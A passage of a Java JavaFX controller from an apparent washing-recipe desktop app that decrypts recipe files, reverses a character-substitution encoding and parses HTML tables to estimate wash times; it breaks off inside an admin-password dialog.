package kadysoft.kady;
//IMPORTS
import com.itextpdf.text.FontFactory;
import com.itextpdf.text.PageSize;
import com.itextpdf.text.Paragraph;
import com.itextpdf.text.Phrase;
import com.itextpdf.text.pdf.PdfPCell;
import com.itextpdf.text.pdf.PdfPTable;
import com.itextpdf.text.pdf.PdfWriter;
import com.jfoenix.controls.JFXButton;
import com.jfoenix.controls.JFXTextArea;
import com.jfoenix.controls.JFXTextField;
import java.awt.Desktop;
import java.awt.Graphics;
import java.awt.GraphicsEnvironment;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.*;
import java.math.BigDecimal;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.time.ZoneOffset;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.List;
import java.util.Optional;
import java.util.Random;
import java.util.ResourceBundle;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import javafx.animation.FadeTransition;
import javafx.animation.KeyFrame;
import javafx.animation.Timeline;
import javafx.application.Platform;
import javafx.beans.property.SimpleStringProperty;
import javafx.beans.value.ObservableValue;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.concurrent.Service;
import javafx.concurrent.Task;
import javafx.concurrent.WorkerStateEvent;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.fxml.Initializable;
import javafx.geometry.Bounds;
import javafx.geometry.Insets;
import javafx.geometry.NodeOrientation;
import javafx.geometry.Pos;
import javafx.geometry.Rectangle2D;
import javafx.scene.Node;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.Alert;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.control.Button;
import javafx.scene.control.ButtonType;
import javafx.scene.control.CheckBox;
import javafx.scene.control.Dialog;
import javafx.scene.control.DialogPane;
import javafx.scene.control.Hyperlink;
import javafx.scene.control.Label;
import javafx.scene.control.ListView;
import javafx.scene.control.Slider;
import javafx.scene.control.TableColumn;
import javafx.scene.control.TablePosition;
import javafx.scene.control.TableRow;
import javafx.scene.control.TableView;
import javafx.scene.control.TextField;
import javafx.scene.control.ToggleGroup;
import javafx.scene.control.Tooltip;
import javafx.scene.effect.DropShadow;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.input.MouseEvent;
import javafx.scene.layout.BorderPane;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.Pane;
import javafx.scene.layout.Priority;
import javafx.scene.layout.StackPane;
import javafx.scene.layout.VBox;
import javafx.scene.media.AudioClip;
import javafx.scene.paint.Color;
import javafx.scene.shape.Circle;
import javafx.scene.shape.Rectangle;
import javafx.scene.text.TextAlignment;
import javafx.scene.web.WebView;
import javafx.stage.DirectoryChooser;
import javafx.stage.FileChooser;
import javafx.stage.Screen;
import javafx.stage.Stage;
import javafx.stage.StageStyle;
import javafx.stage.Window;
import javafx.util.Callback;
import javafx.util.Duration;
import javax.imageio.ImageIO;
import javax.swing.JEditorPane;
import javax.swing.JOptionPane;
import javax.xml.parsers.ParserConfigurationException;
import static kadysoft.kady.ViewerController_1.drib;
import org.controlsfx.control.Notifications;
import org.controlsfx.control.table.TableFilter;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.xml.sax.SAXException;



public class ViewerController_1  <T extends Comparable<T>>  implements Initializable {
  //FIELDS AND VARIABLES  
  Connection conn = null;
  ResultSet rs = null;
  PreparedStatement pst = null;
  ToggleGroup tg;
  
  
  
  
  public static String pecoco;
////////////////////////////////////////////////////////////////////////////////////////////////////////   
        public static String getValueByKey(String filePath, String key) {
        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {
            String line;
            while ((line = br.readLine()) != null) {
                if (!line.contains("=")) {
                continue;
                }
                String[] parts = line.split("=", 2);
                String currentKey = parts[0].trim();
                if (currentKey.equals(key)) {
                    return parts[1].trim();
                }
            }
        } catch (IOException e) {
        e.printStackTrace();
        }
        return null; 
    }
///////////////////////////////////////////////////////////////////////////////////////////////////////////
  @FXML
  private TableView table;
  private ObservableList<String> storedRowData = null;
  @FXML
    private WebView addo; 
  @FXML
    private JFXButton performance;
  @FXML
  private CheckBox audit;
  @FXML
    private JFXButton printic,getallbtn1;
    @FXML
    private JFXButton editorprint,chemicalplan;
  @FXML
  private JFXButton getallbtn,coster; 
  @FXML
  private Label tablee,image,link;
  @FXML
  private JFXTextArea coode;
  public static String imoo,imoo1,imoo2,hihi;
  @FXML
  private JFXButton seepilot,timer;
  public static String useb,drib;
  @FXML
    private JFXButton recipeprocesses;
    @FXML
    private JFXButton calculatetime;
    @FXML
    private Label openadmin;
    public static String theuserrr,passwordyyy;
  public static String find;
    private double dx = 2; // سرعة X
    private double dy = 2; // سرعة Y
    private final Random random = new Random();   
    public static String letterr=getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Recipes_Path");
    public static String lproduct,rproduct,tempraturee,ftank,etank,cdosage,timer_temprature,oldtimemin,oldtimehour,oldtimemin2,oldtimehour2,msg;
    public static String passy,passyy,wifi;
    public static double loadstone,loadstone2;
    public static double removestone,removestone2;
    public static double cleaningstone,cleaningstone2;
    public static double extraction,extraction2;
    public static double loadremovestone,loadremovestone2;
    public static double loadremoveproduct,loadremoveproduct2,loadremoveproductall;
    public static double tempraturetime,tempraturetime2,tempraturetimeall;
    public static double chemicaldosage,chemicaldosage2,chemicaldosageall;
    public static double fillemptytank,fillemptytank2,fillemptytankall;
    public static double gdf1,gdf2,gmf1,gmf2;
    public static double stonabathth,stonabaththh;
    public static Elements domy;
    public static int bosbos,shoty;
  public static String bosboss;
      public static String stonn;
      public static String fomm;
      public static String hypoo;
      public static String enzymm;
      public static String moonn;
      public static String dryr11;
      public static String dryr22;
      public static String dryr33;
      public static String notifile;
      public static String notiimg;
      public static String repeats;
      public static String closes;
      public static double repeatd;
      public static double closed;
      Timer fileCheckTimer,fileCheckTimer5;
      Timer fileCheckTimer2;
      Timer fileCheckTimer3; 
      Timer fileCheckTimer4;
    @FXML
private ImageView searchrecipe;
private int currentStep = 0;
private List<TourStep> steps = new ArrayList<>();
private Pane overlayPane;
//String CONFIG_FILE = "config.txt";
@FXML private BorderPane mainRoot;
@FXML
private ListView<String> steplist;
    
    
   
    

//BODY AND METHODS
    @FXML
    void searchrecipeaction(MouseEvent event) {
        FileSearchApp fsa=new FileSearchApp();
        fsa.start(new Stage()); 
    }
    
    
    
    
    
    @FXML
    void coasteraction (ActionEvent event) throws IOException {}

    
    
    
    
    @FXML
    void chemicalplanaction(ActionEvent event) throws IOException {
    Stage stg = new Stage();
    Parent root = FXMLLoader.<Parent>load(getClass().getResource("Chemical_Planner.fxml"));
    Scene sce = new Scene(root);
    String themooo=getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes");
    URL cssUrl = getClass().getResource(themooo);
    if (cssUrl == null) {
    System.err.println("ERROR: cupertino-dark.css not found in same package as controller!");
    } else {
        String cssPath = cssUrl.toExternalForm();
        sce.getStylesheets().add(cssPath);
        root.getStylesheets().add(cssPath);
    }
    stg.setTitle("Chemical Plan");
    stg.setResizable(true);
    stg.setScene(sce);
    stg.setMaximized(true);
    stg.centerOnScreen();
    stg.getIcons().add(new javafx.scene.image.Image(Main.class.getResourceAsStream("washing.png")));
    stg.show();
    }
    
    
    
    
    
    @FXML
    void performanceaction(ActionEvent event) throws IOException {
    Stage stg = new Stage();
    Parent root = FXMLLoader.<Parent>load(getClass().getResource("Performance.fxml"));
    Scene sce = new Scene(root);
    stg.setTitle("Worker Performance");
    stg.setResizable(false);
    stg.setScene(sce);
    stg.centerOnScreen();
    stg.getIcons().add(new javafx.scene.image.Image(Main.class.getResourceAsStream("washing.png")));
    stg.show();   
    }
    
    
    
    
    
    @FXML
    void aiaraiaraction(ActionEvent event) throws IOException {   
    Stage stg = new Stage();
    Parent root = FXMLLoader.<Parent>load(getClass().getResource("Aiar.fxml"));
    Scene sce = new Scene(root);
    stg.setTitle("AIAR TOOL");
    stg.setResizable(false);
    stg.setScene(sce);
    stg.centerOnScreen();
    stg.getIcons().add(new javafx.scene.image.Image(Main.class.getResourceAsStream("washing.png")));
    stg.show();  
    }
    
    
    
    
    
    @FXML
    void settoaction(MouseEvent event) throws IOException {
    Stage stg = new Stage();
    Parent root = FXMLLoader.<Parent>load(getClass().getResource("Settings.fxml"));
    Scene sce = new Scene(root);
    String themooo=getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes");
    URL cssUrl = getClass().getResource(themooo);
    if (cssUrl == null) {
    System.err.println("ERROR: cupertino-dark.css not found in same package as controller!");
    } else {
    String cssPath = cssUrl.toExternalForm();
    sce.getStylesheets().add(cssPath);
    root.getStylesheets().add(cssPath);
    }
    stg.setTitle("Settings");
    stg.setResizable(true);
    stg.setScene(sce);
    stg.setMaximized(true);
    stg.centerOnScreen();
    stg.getIcons().add(new javafx.scene.image.Image(Main.class.getResourceAsStream("washing.png")));
    stg.show();  
    }
    
    
    
    
    
    @FXML
    void calculatetimeaction(ActionEvent event) throws FileNotFoundException, UnsupportedEncodingException, IOException, Exception {
          String opaa=openadmin.getText();
        if (opaa.equals("Open Admin")) {
              Notifications noti = Notifications.create();
              noti.title("Fatal Error!");
              noti.text("We Can't continue, Open Admin First.");
              noti.position(Pos.CENTER);
              noti.hideAfter(Duration.seconds(3));
              noti.showError();
        }
        else {
//Cal Time Here
FileChooser fcho = new FileChooser();
fcho.getExtensionFilters().add(new FileChooser.ExtensionFilter("Kadysoft Files", new String[] { "*.ks" }));
fcho.getExtensionFilters().add(new FileChooser.ExtensionFilter("HTML Files", new String[] { "*.html" }));
fcho.setTitle("Kady Choose");
File f = fcho.showOpenDialog((Window)null);
String recipenami=f.getName().replace(".ks","").replace(".html","");
String recipepathy = f.getAbsolutePath().toString();



    ////////////////////////////////////////////////////////////

    String longKey;
    try (BufferedReader cxsd = new BufferedReader(new FileReader("lib\\java.dat"))) {
        longKey = cxsd.readLine();
    }
    if (longKey == null || longKey.trim().isEmpty()) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("java.dat is empty!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String result = KeyDecoder.extractData(longKey.trim());
    if (f == null) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("Choose file first!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String input = f.getAbsolutePath();
    String nameofit=f.getName();
    String tempOutput = System.getProperty("user.home")+"\\"+nameofit;
 
    FileDecryptor.decrypt(input, tempOutput, result);
    File tempk = new File(tempOutput);
    
    ////////////////////////////////////////////////////////////



InputStream inputinstream=new FileInputStream(tempk);
BufferedReader bi=new BufferedReader (new InputStreamReader (inputinstream,"UTF-8"));
String lo;
coode.clear();
while ((lo=bi.readLine())!=null) {        
coode.appendText("\n"+lo
.replace("ﬦ","A")
.replace("ﬧ","B")
.replace("ﬨ","C")
.replace("﬩","D")
.replace("שׁ","E")    
.replace("שׂ","F")        
.replace("שּׁ","G")         
.replace("שּׂ","H")         
.replace("אַ","I")         
.replace("אָ","J")         
.replace("אּ","K")         
.replace("בּ","L")         
.replace("גּ","M")         
.replace("דּ","N")         
.replace("הּ","O")         
.replace("וּ","P")         
.replace("זּ","Q")         
.replace("טּ","R")         
.replace("יּ","S")         
.replace("ךּ","T")         
.replace("כּ","U")         
.replace("לּ","V")
.replace("מּ","W")         
.replace("נּ","X")         
.replace("סּ","Y")         
.replace("ףּ","Z")         
.replace("פּ","0")         
.replace("צּ","1")         
.replace("קּ","2")         
.replace("רּ","3")         
.replace("שּ","4")         
.replace("תּ","5")         
.replace("וֹ","6")         
.replace("בֿ","7")         
.replace("כֿ","8")
.replace("פֿ","9")
.replace("&NBSP;","")                       
); 
}
bi.close();




String gf=coode.getText();
OutputStream instreamm=new FileOutputStream(System.getProperty("user.home")+"\\iq.ks");
PrintWriter pwe = new PrintWriter(new OutputStreamWriter (instreamm,"UTF-8"));
pwe.println(gf);
pwe.close();

    ////////////////////////////////////////////////////////////////
    if (tempk.exists()) {
        tempk.delete();
    }
    ////////////////////////////////////////////////////////////////

   //Get Time And Shots
   List<Integer> time = new ArrayList<>();
   List<Integer> timeSum = new ArrayList<>();
   List<String> shots = new ArrayList<>();
   int sum = 0, bathnum=0, firstshot=0, secondshot=0,thirdshot=0,forthshot=0;
   File inputFile = new File(System.getProperty("user.home")+"\\iq.ks"); //
   org.jsoup.nodes.Document doc = Jsoup.parse(inputFile, "UTF-8"); //
   for (Element table : doc.select("tbody")) {
   for (Element row : table.select("tr")) {
   Elements tds = row.select("td");
   if (tds.get(2).text().isEmpty()||tds.get(2).text().contains("/")||tds.get(2).text().contains("\\")||tds.get(2).text().contains("SPIN")||tds.get(2).text().contains("spin")||tds.get(2).text().contains("TIME")||tds.get(2).text().contains("time")||tds.get(2).text().matches("[a-zA-Z_]+")||tds.get(2).text().contains("PRODUCTION")||tds.get(2).text().contains("RECIPE")||tds.get(2).text().contains("RECIPI")||tds.get(2).text().contains("DATE")||tds.get(2).text().contains("WASH")) {}
   else {
   String stringg=tds.get(2).text().replace(" CONT","").replace(" CONG","").replace("CONG","").replace(" cont","").replace(" CNTRL","").replace(" control","").replace(" CONTROL","").replace(" con","").replace(" CON","").replace(" CNTRL","").replace(" KONTROL","").replace("CONT","").replace("cont","").replace("CNTRL","").replace("control","").replace("CONTROL","").replace("con","").replace("CON","").replace("CNTRL","").replace("KONTROL","");
   if (stringg.contains("+")) {
   String sum1 = stringg;
   String[] numbers1 = sum1.split("\\+");
   int total1 = 0;
   for (String numStr1 : numbers1) {
   total1 += Integer.parseInt(numStr1);
   }
   time.add(total1);
   }
   else {
   int ioo=Integer.parseInt(stringg);
   time.add(ioo);     
   }
   }  
                            String dalil=tds.get(3).text();
                            if (dalil.contains("EXTRACT")||dalil.contains("extract")||dalil.contains("Extract")||dalil.contains("EXTRA")||dalil.contains("EXTRACTION")||dalil.contains("extraction")) {
                            for (int i = 0; i < time.size(); i++)
                            sum += time.get(i);
                            timeSum.add(sum);
                            time.clear();
                            shots.add(dalil);}else {
                            }}}
                          bathnum=shots.size();
                          if (shots.size()==1) {
                          firstshot=timeSum.get(0);}
                          else if (shots.size()==2) {
                          firstshot=timeSum.get(0);
                          secondshot=timeSum.get(1)-timeSum.get(0);}
                          else {
                          }
      timer_temprature="30";
                            int temp=0;
                            int temp2=0;
                            int temp3=0;
                            String timer_tempra=timer_temprature;
                            int timer_temp=Integer.parseInt(timer_tempra);
                            org.jsoup.nodes.Document docy = Jsoup.parse(inputFile, "UTF-8"); //      
                            for (Element table : docy.select("table")) {
                            for (Element row : table.select("tr")) {
                            Elements tds = row.select("td");
                            if (tds.get(3).text().contains("/")||tds.get(3).text().contains("\\")||tds.get(3).text().isEmpty()||tds.get(3).text().contains("TEMP")||tds.get(3).text().contains("OPERATOR")||tds.get(3).text().contains("temp")||tds.get(3).text().contains("operator")) {}
                            else {   
                            String tempo=tds.get(3).text();
                            if (tempo.contains("EXTRACT")) {
                                String pattern = "[a-zA-Z_ _&_.]+";
                                tempo = tempo.replaceAll(pattern, "");
                                if (tempo.matches("[0-9]+")) {
                                int cvd2=Integer.parseInt(tempo); 
                                if (cvd2>timer_temp) { 
                                temp2+=1;
                                }
                                else {
                                }}break;
                             }
                            else {
                                String pattern = "[a-zA-Z_ _&_.]+";  
                                tempo = tempo.replaceAll(pattern, "");
                                if (tempo.matches("[0-9]+")) {
                                int cvd=Integer.parseInt(tempo); 
                                if (cvd>timer_temp) { 
                                temp+=1;
                                }else {}}
                            }}}}
                            int tempall=0;
                            org.jsoup.nodes.Document docc = Jsoup.parse(inputFile, "UTF-8"); // 
                            for (Element table : docc.select("table")) {
                            for (Element row : table.select("tr")) {
                            Elements tds = row.select("td");
                            if (tds.get(3).text().contains("/")||tds.get(3).text().contains("\\")||tds.get(3).text().isEmpty()||tds.get(3).text().contains("TEMP")||tds.get(3).text().contains("OPERATOR")||tds.get(3).text().contains("temp")||tds.get(3).text().contains("operator")) {}
                            else {
                                String tempo=tds.get(3).text();
                                String pattern = "[a-zA-Z_ _&_.]+";
                                tempo = tempo.replaceAll(pattern, "");
                                if (tempo.matches("[0-9]+")) {
                                int cvd=Integer.parseInt(tempo); 
                                if (cvd>timer_temp) { 
                                tempall+=1;}
                                else {}}else {}}}}
                            int stonebathh=0;
                            org.jsoup.nodes.Document doccc = Jsoup.parse(inputFile, "UTF-8"); // 
                            for (Element table : doccc.select("table")) {
                            for (Element row : table.select("tr")) {
                            Elements tds = row.select("td");
                            if (tds.get(7).text().isEmpty()||tds.get(7).text().contains("/")||tds.get(7).text().contains("\\")||tds.get(7).text().contains("CHEMICAL")||tds.get(7).text().contains("chemical")||tds.get(7).text().matches("[0-9_-]+")) {}
                            else {
                            String erw=tds.get(7).text().toString();
                            if (erw.contains("STONE")||erw.contains("STON")||erw.contains("BOOL")||erw.contains("FOAM")||erw.contains("BOLL"))  {
                            stonebathh+=1;  
                            }else {}}}}
                            int waterbath=0;
                            int waterbath2=0;
                            org.jsoup.nodes.Document docu = Jsoup.parse(inputFile, "UTF-8"); // 
                            for (Element table : docu.select("table")) {
                            for (Element row : table.select("tr")) {
                            Elements tds = row.select("td");
                            if (tds.get(4).text().contains("'")||tds.get(4).text().contains("DRYER")||tds.get(4).text().contains("LITER")||tds.get(4).text().matches("[a-zA-Z_]+")) {}
                            else {
                            String tempo=tds.get(3).text();
                            if (tempo.contains("EXTRACT")) {
                                if (tds.get(4).text().matches("[0-9]+")) {
                                int cvd2=Integer.parseInt(tds.get(4).text()); 
                                waterbath2+=1;
                                }
                                break; 
                            }
                            else {
                                if (tds.get(4).text().matches("[0-9]+")) {
                                int cvd=Integer.parseInt(tds.get(4).text()); 
                                waterbath+=1;
                                }
                            }
                           }}}
                            int waterbathall=0;
                            org.jsoup.nodes.Document dock = Jsoup.parse(inputFile, "UTF-8"); // 
                            for (Element table : dock.select("table")) {
                            for (Element row : table.select("tr")) {
                            Elements tds = row.select("td");
                            if (tds.get(4).text().isEmpty()||tds.get(4).text().contains("'")||tds.get(4).text().contains("DRYER")||tds.get(4).text().contains("LITER")||tds.get(4).text().matches("[a-zA-Z_]+")) {}
                            else { 
                            String erw=tds.get(4).text().toString();
                            waterbathall+=1;
                            }}}
      lproduct="2.45";
      rproduct="0.5";
      tempraturee="1.5";
      ftank="1.5";
      etank="3.55";
      cdosage ="6.3";
    String lproductt=lproduct;
    String rproductt=rproduct;
    String tempratureee=tempraturee;
    String ftankk=ftank;
    String etankk=etank;
    String cdosagee=cdosage;
    int bathnumm=bathnum;
    bosbos=bathnum;
    double firstshott=firstshot;
    double secondshott=secondshot;
    int tempp=temp;
    int tempp2=tempall-temp;
    int temppall=tempall;
    int waterbathx=waterbath;
    int waterbath2x=waterbathall-waterbath;
    int waterbathallx=waterbathall;
    int stonebathhh=stonebathh;
    loadremoveproduct=Double.parseDouble(lproductt)+Double.parseDouble(rproductt);
    tempraturetime=tempp*Double.parseDouble(tempratureee);
    chemicaldosage=Double.parseDouble(cdosagee);
    fillemptytank=waterbathx*(Double.parseDouble(ftankk)+Double.parseDouble(etankk));
    loadremoveproduct2=Double.parseDouble(lproductt)+Double.parseDouble(rproductt);
    tempraturetime2=tempp2*Double.parseDouble(tempratureee);
    chemicaldosage2=Double.parseDouble(cdosagee);
    fillemptytank2=waterbath2x*(Double.parseDouble(ftankk)+Double.parseDouble(etankk));
    loadremoveproductall=Double.parseDouble(lproductt)+Double.parseDouble(rproductt);
    tempraturetimeall=temppall*Double.parseDouble(tempratureee);
    chemicaldosageall=Double.parseDouble(cdosagee);
    fillemptytankall=waterbathallx*(Double.parseDouble(ftankk)+Double.parseDouble(etankk));
    if (bathnumm==1) {
      JFXTextField fss=new JFXTextField ("");
      fss.setPromptText("Write Stone Baths Number");
      fss.setMinSize(300, 30);
      fss.setLabelFloat(true);
      fss.setStyle("-fx-font-weight:bold;");
      fss.setEditable(true);
      Alert alerto = new Alert(Alert.AlertType.INFORMATION);
      alerto.setTitle("Stone Bath?");
      alerto.setHeaderText("We found stone or foam "+stonebathhh+" times. but 1 shot.");
      alerto.setContentText("Hello, Please tell me: Stone Baths Number?.");
      alerto.setGraphic(fss);
      alerto.setResizable(false);
      DialogPane dialogPaneo = alerto.getDialogPane();
      dialogPaneo.getStylesheets().add(
    getClass().getResource(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes")).toExternalForm());
      Optional<ButtonType> optiono = alerto.showAndWait();
      passy=fss.getText();
      stonabathth=Double.parseDouble(passy);
      if (optiono.get() == null) {} 
      else if (optiono.get() == ButtonType.OK) {
          if (stonabathth==0) {
          loadstone=0;
          removestone=0;
          cleaningstone=0;
          extraction=0;
          double dos3=loadstone+removestone;
          loadremovestone=dos3;
      }
      else if (stonabathth==1){
          loadstone=5.5;
          removestone=4.15;
          cleaningstone=15;
          extraction=20;
          double dos3=loadstone+removestone;
          loadremovestone=dos3;
      }
      else if (stonabathth==2){
          loadstone=16.5;
          removestone=8.3;
          cleaningstone=20;
          extraction=20;
          double dos3=loadstone+removestone;
          loadremovestone=dos3;  
      }
      else {
          double v=stonabathth;
          double v1=v*4.15;
          double v2=15+((v-1)*1.5);
          loadstone=v2;
          removestone=v1;
          cleaningstone=0;
          extraction=20;
          double dos3=loadstone+removestone;
          loadremovestone=dos3;
      }
      }
      else if (optiono.get() == ButtonType.CANCEL) {
      Notifications noti = Notifications.create();
      noti.title("Cancel!");
      noti.text("Operation Cancelled, Something was wrong.");
      noti.position(Pos.CENTER);
      noti.hideAfter(Duration.seconds(3));
      noti.showInformation();
      } else {
      } 
    }
    else if (bathnumm==2) { 
      JFXTextField fss=new JFXTextField ("");
      fss.setPromptText("Write Stone Baths Number");
      fss.setMinSize(300, 30);
      fss.setLabelFloat(true);
      fss.setStyle("-fx-font-weight:bold;");
      fss.setEditable(true);
      Alert alerto = new Alert(Alert.AlertType.INFORMATION);
      alerto.setTitle("Stone Bath?");
      alerto.setHeaderText("We found stone or foam "+stonebathhh+" times. for the first shot.");
      alerto.setContentText("Hello, Please tell me: Stone Baths Number?.");
      alerto.setGraphic(fss);
      alerto.setResizable(false);
      DialogPane dialogPaneo = alerto.getDialogPane();
      dialogPaneo.getStylesheets().add(
    getClass().getResource(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes")).toExternalForm());
      Optional<ButtonType> optiono = alerto.showAndWait();
      passy=fss.getText();
      stonabathth=Double.parseDouble(passy);
      if (optiono.get() == null) {} 
      else if (optiono.get() == ButtonType.OK) {
          /////////////////////////////////Stone Bath////////////////////////////////////////
          if (stonabathth==0) {
          loadstone=0;
          removestone=0;
          cleaningstone=0;
          extraction=0;
          double dos3=loadstone+removestone;
          loadremovestone=dos3;
      }
      else if (stonabathth==1){
          loadstone=5.5;
          removestone=4.15;
          cleaningstone=15;
          extraction=20;
          double dos3=loadstone+removestone;
          loadremovestone=dos3;
      }
      else if (stonabathth==2){
          loadstone=16.5;
          removestone=8.3;
          cleaningstone=20;
          extraction=20;
          double dos3=loadstone+removestone;
          loadremovestone=dos3;
      }
      else {
          double v=stonabathth;
          double v1=v*4.15;
          double v2=15+((v-1)*1.5);
          loadstone=v2;
          removestone=v1;
          cleaningstone=0;
          extraction=20;
          double dos3=loadstone+removestone;
          loadremovestone=dos3;  
      }
      }
      else if (optiono.get() == ButtonType.CANCEL) {
      Notifications noti = Notifications.create();
      noti.title("Cancel!");
      noti.text("Operation Cancelled, Something was wrong.");
      noti.position(Pos.CENTER);
      noti.hideAfter(Duration.seconds(3));
      noti.showInformation();
      } else { 
      }
      JFXTextField fsss=new JFXTextField ("");
      fsss.setPromptText("Write Stone Baths Number");
      fsss.setMinSize(300, 30);
      fsss.setLabelFloat(true);
      fsss.setStyle("-fx-font-weight:bold;");
      fsss.setEditable(true);
      Alert alertoo = new Alert(Alert.AlertType.INFORMATION);
      alertoo.setTitle("Stone Bath?");
      alertoo.setHeaderText("We found stone or foam "+stonebathhh+" times. for the second shot.");
      alertoo.setContentText("Hello, Please tell me: Stone Baths Number?.");
      alertoo.setGraphic(fsss);
      alertoo.setResizable(false);
      DialogPane dialogPaneoo = alertoo.getDialogPane();
      dialogPaneoo.getStylesheets().add(
    getClass().getResource(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes")).toExternalForm());
      Optional<ButtonType> optionoio = alertoo.showAndWait();
      passyy=fsss.getText();
      stonabaththh=Double.parseDouble(passyy);
      if (optionoio.get() == null) {} 
      else if (optionoio.get() == ButtonType.OK) {
          /////////////////////////////////Stone Bath////////////////////////////////////////
          if (stonabaththh==0) {
          loadstone2=0;
          removestone2=0;
          cleaningstone2=0;
          extraction2=0;
          double dos3=loadstone2+removestone2;
          loadremovestone2=dos3;
      }
      else if (stonabaththh==1){
          loadstone2=5.5;
          removestone2=4.15;
          cleaningstone2=15;
          extraction2=20;
          double dos3=loadstone2+removestone2;
          loadremovestone2=dos3;

      }      
      else if (stonabaththh==2){
          loadstone2=16.5;
          removestone2=8.3;
          cleaningstone2=20;
          extraction2=20;
          double dos3=loadstone2+removestone2;
          loadremovestone2=dos3;
      }
      else {
          double v=stonabaththh;
          double v1=v*4.15;
          double v2=15+((v-1)*1.5);
          loadstone2=v2;
          removestone2=v1;
          cleaningstone2=0;
          extraction2=20;
          double dos3=loadstone2+removestone2;
          loadremovestone2=dos3;  
      }
      }
      else if (optionoio.get() == ButtonType.CANCEL) {
      Notifications noti = Notifications.create();
      noti.title("Cancel!");
      noti.text("Operation Cancelled, Something was wrong.");
      noti.position(Pos.CENTER);
      noti.hideAfter(Duration.seconds(3));
      noti.showInformation();
      } else {
      }
    }
    /////////////////////////////////////////////Starting//////////////////////////////////////////////////////////
    if (bathnumm==1) {
        gmf1=stonabathth+firstshott+loadremoveproduct+loadremovestone+tempraturetime+extraction+chemicaldosage+fillemptytank;
        gdf1=(stonabathth+firstshott+loadremoveproduct+loadremovestone+tempraturetime+extraction+chemicaldosage+fillemptytank)/60.0;
        //Write to recipe here //////////////////////////////////////////////////////////
Alert aloo = new Alert(Alert.AlertType.INFORMATION);
aloo.setTitle("Show Time");
aloo.setResizable(false);
aloo.setHeaderText("Here is time for "+recipenami+"");
aloo.setContentText("This Recipe Was One Shot:\nTime In Minutes=   "+gmf1+"."+"\nTime In Hours=   "+gdf1+".");
DialogPane dialogPanej = aloo.getDialogPane();
dialogPanej.getStylesheets().add(
getClass().getResource(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes")).toExternalForm());
aloo.showAndWait();
    }
    else if (bathnumm==2) {
        gmf1=stonabathth+firstshott+loadremoveproduct+loadremovestone+tempraturetime+extraction+chemicaldosage+fillemptytank;
        gdf1=(stonabathth+firstshott+loadremoveproduct+loadremovestone+tempraturetime+extraction+chemicaldosage+fillemptytank)/60.0;
        gmf2=stonabaththh+secondshott+loadremoveproduct2+loadremovestone2+tempraturetime2+extraction2+chemicaldosage2+fillemptytank2;
        gdf2=(stonabaththh+secondshott+loadremoveproduct2+loadremovestone2+tempraturetime2+extraction2+chemicaldosage2+fillemptytank2)/60.0;
          //Write to recipe here //////////////////////////////////////////////////////////  
Alert aloo = new Alert(Alert.AlertType.INFORMATION);
aloo.setTitle("Show Time");
aloo.setResizable(false);
aloo.setHeaderText("Here is time for "+recipenami+"");
aloo.setContentText("This Recipe Was Two Shots:\nFirst Shot Info:\nTime In Minutes=   "+gmf1+"."+"\nTime In Hours=   "+gdf1+".\n\n"+"Second Shot Info:\nTime In Minutes=   "+gmf2+"."+"\nTime In Hours=   "+gdf2+".\n\n");
DialogPane dialogPanej = aloo.getDialogPane();
dialogPanej.getStylesheets().add(
getClass().getResource(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes")).toExternalForm());
aloo.showAndWait();  
    }
    else {
        //Noti  
      Notifications noti = Notifications.create();
      noti.title("Cancel!");
      noti.text("Operation Cancelled, We don't have 3 shots in one recipe.\nWe are working on this feature\nCall Developer to calculate it for you in full version.");
      noti.position(Pos.CENTER);
      noti.hideAfter(Duration.seconds(5));
      noti.showError();
    }
    /////////////////////////////////////////////Ending////////////////////////////////////////////////////////////  
        }  
    }

    
    
    
    
    @FXML
    void openadminaction(MouseEvent event) {
        String opa=openadmin.getText();
        if (opa.equals("Open Admin")) {    
      theuserrr="KADINIO";  
      //////////Get Password Here From DB//////////////////
      try {
      String sql = "select * from Timor where User=?";
      pst = conn.prepareStatement(sql);
      pst.setString(1, theuserrr);
      rs = pst.executeQuery();
      passwordyyy = rs.getString("Password");
    }
        catch (Exception exception) {
    } 
        finally {
      try {
        rs.close();
        pst.close();
      } catch (Exception exception) {}
    } 
      JFXTextField fss=new JFXTextField ("");
      fss.setPromptText("Write your password ...");
      fss.setMinSize(300, 30);
      fss.setLabelFloat(true);
      fss.setStyle("-fx-font-weight:bold;");
      fss.setEditable(true);
      Alert alerto = new Alert(Alert.AlertType.WARNING);
      alerto.setTitle("UR Password?");
      alerto.setHeaderText("Please be careful, this info is important.");
      alerto.setContentText("Hello, Please tell me: your password?.");
